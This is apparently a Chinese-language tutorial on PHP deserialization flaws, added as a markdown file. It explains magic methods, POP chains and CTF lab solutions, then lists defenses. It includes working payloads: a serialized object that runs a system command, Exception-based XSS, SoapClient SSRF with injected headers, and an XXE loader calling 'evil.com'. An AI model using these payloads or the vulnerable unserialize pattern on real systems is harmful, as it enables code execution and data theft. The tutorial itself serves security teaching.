@@ -1,0 +1,213 @@
+引言
+
+反序列化漏洞在Web安全领域始终占据重要地位，其影响横跨PHP、Java、Python等多种语言。攻击者通过构造恶意序列化数据，在对象还原过程中劫持程序逻辑，最终实现代码执行、信息泄露、内网探测等危害。本文以PHP为例，从序列化基础、魔术方法触发机制出发，深入探讨漏洞成因与POP链构造思想，并结合原生类攻击面及CTF实战案例，完整呈现PHP反序列化漏洞从理论到利用的全过程。
+
+---
+
+一、反序列化基础概念
+
+1.1 序列化与反序列化
+
+序列化（Serialization）是将对象转换为可存储或传输的字符串/字节流的过程；反序列化（Deserialization）则逆向将该字符串还原为内存中的对象。在PHP中通过两个函数完成：
+
+```php
+serialize()    // 对象 → 字符串
+unserialize()  // 字符串 → 对象
+```
+
+示例：
+
+```php
+class User {
+    public $name = 'admin';
+    public $isVip = true;
+}
+$obj = new User();
+echo serialize($obj);
+// O:4:"User":2:{s:4:"name";s:5:"admin";s:5:"isVip";b:1;}
+```
+
+1.2 为什么需要序列化？
+
+序列化主要用于持久化存储（Session、缓存）或跨脚本/服务传输对象状态。然而，当反序列化的数据源由用户控制且未经验证时，便打开了潘多拉的魔盒。
+
+---
+
+二、魔术方法：反序列化自动触发的“钩子”
+
+PHP类中以下划线开头的方法具有特定自动调用时机，统称“魔术方法”。反序列化漏洞的根基就在于还原对象时会自动触发某些魔术方法，若其中包含危险操作，攻击者即可通过精心构造的属性值触发恶意行为。
+
+魔术方法 触发时机 反序列化关联性
+__construct() new实例化对象 无关（需主动创建）
+__destruct() 对象被销毁时（脚本结束或引用清零） 高
+__wakeup() unserialize()时优先调用 极高
+__toString() 对象被当作字符串使用时 中（若输出对象）
+__call() 调用不存在的方法 中（触发点）
+__invoke() 以函数方式调用对象 中（触发点）
+__get()/__set() 访问/赋值不存在的属性 中（触发点）
+……  
+
+典型漏洞示例：
+
+```php
+class B {
+    public $cmd = '';
+    public function __destruct() {
+        system($this->cmd);   // 析构时执行系统命令
+    }
+}
+// 用户可控反序列化入口
+unserialize($_GET['x']);
+```
+
+此处虽未显式创建对象，但unserialize()还原对象后脚本结束触发__destruct，攻击者传递x=O:1:"B":1:{s:3:"cmd";s:2:"id";}即可执行id命令。
+
+---
+
+三、漏洞成因：不可信数据反序列化
+
+反序列化漏洞核心成因可概括为：
+
+未对用户输入的序列化字符串进行任何校验，攻击者通过控制对象属性值，利用自动触发的魔术方法导向危险操作。
+
+不仅仅是命令执行，任意文件读取、SQL注入、XSS、SSRF、XXE等均可能在反序列化链中实现，具体取决于被触发的逻辑。
+
+---
+
+四、POP链：当漏洞不在魔术方法中
+
+现实场景中，危险函数往往位于普通方法中，而非魔术方法。此时需要构造一条从魔术方法入口到目标方法的调用链，通过串联多个类的属性与逻辑，使攻击最终抵达敏感函数。这种技术称为POP（Property-Oriented Programming），即面向属性编程。
+
+4.1 POP链三要素
+
+· 起点（Entry）：自动触发的魔术方法（如__destruct、__wakeup、__toString）
+· 跳板（Gadget）：中间调用的普通方法，逐步传递控制流
+· 终点（Sink）：执行危险操作的方法（如eval、system、file_put_contents）
+
+攻击者通过修改序列化字符串中的属性值，使对象在反序列化后执行预定义的调用链。
+
+---
+
+五、实战案例：从黑盒盲猜到白盒链构造
+
+5.1 黑盒视角（PortSwigger实验室）
+
+Web应用常将对象序列化后存入Cookie、Session或隐藏域。修改序列化数据中的属性值可直接影响业务逻辑。
+
+```
+O:4:"User":2:{s:8:"username";s:6:"wiener";s:5:"admin";b:0;}
+```
+
+将admin布尔值改为b:1，即可提权。这是反序列化漏洞最直白的利用——属性欺骗。
+
+5.2 白盒训练：CTFSHOW反序列化系列
+
+254-对象引用执行逻辑
+
+直接通过GET参数传递，无序列化，属于逻辑漏洞，略过。
+
+255-256 反序列化变量修改
+
+```php
+class ctfShowUser {
+    public $isVip = true;
+}
+```
+
+后端将Cookie中的user字符串反序列化为ctfShowUser对象，通过修改isVip为b:1可绕过VIP校验。本质上仍是属性篡改。
+
+257 对象调用逻辑
+
+```php
+class ctfShowUser {
+    public $class = 'backDoor';
+    public function __construct() {
+        $this->class = new backDoor();
+    }
+}
+class backDoor {
+    public $code = 'system("tac flag.php");';
+}
+```
+
+__construct在new时执行，但反序列化时不会调用__construct。因此若直接序列化new ctfShowUser()，得到的字符串中class属性为backDoor对象。攻击者可修改code属性为任意命令。此处展示了反序列化不受构造函数限制的特性，可直接控制嵌套对象属性。
+
+258 正则绕过与属性篡改
+
+在258中，代码对序列化字符串进行了替换：str_replace(':11',':+11', ...)。这模拟了某些WAF将数字前的冒号过滤为:+的场景。攻击者只需在序列化字符串中保持同样的替换规则即可绕过。同时，backDoor的code属性被修改为恶意命令，完成RCE。
+
+小结：CTFSHOW 255-258 覆盖了反序列化漏洞利用的最基础形态——直接篡改对象公有属性。
+
+---
+
+六、原生类：无自定义类时的突破口
+
+当目标源码中几乎无可用类时，攻击面是否就此消失？PHP内置类提供了全新的利用维度。通过get_declared_classes()可枚举所有已加载类，筛选出包含特定魔术方法的原生类，进而构造POP链。
+
+6.1 Error/Exception → XSS（利用__toString）
+
+原理：当对象被当作字符串输出（如echo $obj）时，若该类定义了__toString，则会自动调用。Error和Exception类恰好实现了__toString，返回其错误信息，其中包含用户可控的message属性。
+
+利用条件：反序列化后的对象被直接echo或拼接字符串。
+
+Payload：
+
+```php
+$a = new Exception("<script>alert('XSS')</script>");
+echo serialize($a);
+// O:9:"Exception":1:{s:7:"*";s:26:"<script>alert('XSS')</script>";}
+```
+
+[BJDCTF 2nd] xss之光 即通过unserialize反序列化Exception对象触发XSS。
+
+6.2 SoapClient → SSRF（利用__call）
+
+原理：SoapClient类用于SOAP协议通信，其__call方法在调用不存在的方法时触发，可发起HTTP/HTTPS请求。通过控制location、uri及user_agent等参数，可以构造任意HTTP请求，实现SSRF。
+
+利用条件：反序列化后调用对象任意不存在的方法。
+
+Payload：
+
+```php
+$client = new SoapClient(null, [
+    'location' => 'http://192.168.1.4:2222/',
+    'uri'      => 'http://192.168.1.4:2222/',
+    'user_agent' => "uuu\r\nX-Forwarded-For:127.0.0.1\r\n..."
+]);
+echo urlencode(serialize($client));
+```
+
+CTFSHOW-259 利用SoapClient发起带自定义Header的请求，修改X-Forwarded-For为127.0.0.1以访问本地/flag.php，携带token=ctfshow参数获取Flag。
+
+6.3 SimpleXMLElement → XXE（利用__construct）
+
+原理：SimpleXMLElement类用于解析XML，其构造函数支持data_source为URL，并可通过options参数启用外部实体解析（LIBXML_NOENT对应常量2）。当反序列化触发__construct时（需配合unserialize回调函数或__wakeup间接调用），可加载远程DTD，导致XXE。
+
+利用条件：能通过反序列化触发__construct（常见于某些框架的__call调用new $obj()场景），或者目标直接使用unserialize后的对象参数调用构造函数。
+
+Payload：
+
+```php
+$sxe = new SimpleXMLElement('http://evil.com/oob.xml', 2, true);
+echo serialize($sxe);
+```
+
+[SUCTF 2018] Homework 题目中/show.php?module=SimpleXMLElement&args[]=http://attacker/oob.xml&args[]=2&args[]=true 即通过参数实例化SimpleXMLElement，加载外部实体读取文件。
+
+---
+
+七、防御与最佳实践
+
+反序列化漏洞的根本原因在于不可信数据传入反序列化函数。防御应遵循纵深原则：
+
+1. 杜绝使用unserialize()处理用户输入。若必须，则采用allowed_classes白名单限制。
+2. 使用更安全的替代格式：JSON（json_encode/decode）避免对象完整还原。
+3. 完整性校验：对序列化字符串附加HMAC签名，防止篡改。
+4. 升级环境：PHP 7+ 对部分原生类行为做了限制，如SoapClient的__call在反序列化后调用时部分版本已修复，但仍需警惕。
+5. 禁用危险函数：在php.ini中禁用system、eval等，并开启disable_functions。
+
+---
+
+结语
+
+PHP反序列化漏洞从简单的属性欺骗，到复杂的POP链构造，再到原生类开拓的新大陆，始终是攻防博弈的焦点。理解其底层对象管理机制与魔术方法调用规则，是构建有效防御的前提。希望本文能帮助读者系统化梳理这一知识体系，在未来的代码审计与漏洞挖掘中更具主动权。
